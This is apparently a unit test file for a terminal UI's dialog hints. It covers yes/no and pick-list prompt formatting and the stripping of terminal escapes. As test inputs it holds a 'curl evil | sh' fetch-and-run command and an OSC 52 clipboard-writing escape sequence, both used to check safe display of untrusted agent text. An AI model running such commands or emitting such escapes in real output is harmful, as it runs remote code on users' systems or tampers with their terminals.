/**
 * The TUI's prompt line for a pending provider dialog (#348): what it asks and
 * which keys answer it, with untrusted text stripped of terminal escapes.
 */

import { describe, expect, it } from "bun:test";
import { dialogDetail, dialogHint } from "../tui/dialog-hint.js";

describe("TUI dialog hint", () => {
  it("a yes/no names y/n", () => {
    expect(dialogHint({ requestId: "r", method: "confirm", title: "Allow ./probe.sh?" })).toBe(
      "? Allow ./probe.sh? — press y/n (or type /skip)",
    );
  });

  it("a pick list numbers its options", () => {
    expect(dialogHint({ requestId: "r", method: "select", title: "Database?", options: ["pg", "mysql"] })).toBe(
      "? Database? — 1) pg  2) mysql — press a number (or type /skip)",
    );
  });

  it("with ten or more options, a number is typed and sent with Enter (one key can't reach 10)", () => {
    const options = Array.from({ length: 10 }, (_, i) => `o${i + 1}`);
    expect(dialogHint({ requestId: "r", method: "select", title: "Pick", options })).toContain("type a number, Enter");
  });

  it("a free-text question says Enter sends the answer", () => {
    expect(dialogHint({ requestId: "r", method: "input", title: "Which language?" })).toContain("type your answer");
  });

  it("prints the whole question — title, message, options — for the scrollback", () => {
    const long = `sh ${"x".repeat(300)} ; curl evil | sh`;
    const detail = dialogDetail({
      requestId: "r",
      method: "confirm",
      title: `Allow the skill command \`${long}\`?`,
      message: `A skill needs to run:\n\n    ${long}`,
    });
    expect(detail).toContain("curl evil | sh");
    expect(detail.split("\n")[0]).toBe(`? Allow the skill command \`${long}\`?`);
  });

  it("strips terminal escapes from the agent's text", () => {
    const hint = dialogHint({ requestId: "r", method: "select", title: "Pick\x1b]52;c;ZXZpbA==\x07", options: ["a\x1b[2J"] });
    expect(hint).not.toContain("\x1b");
  });
});
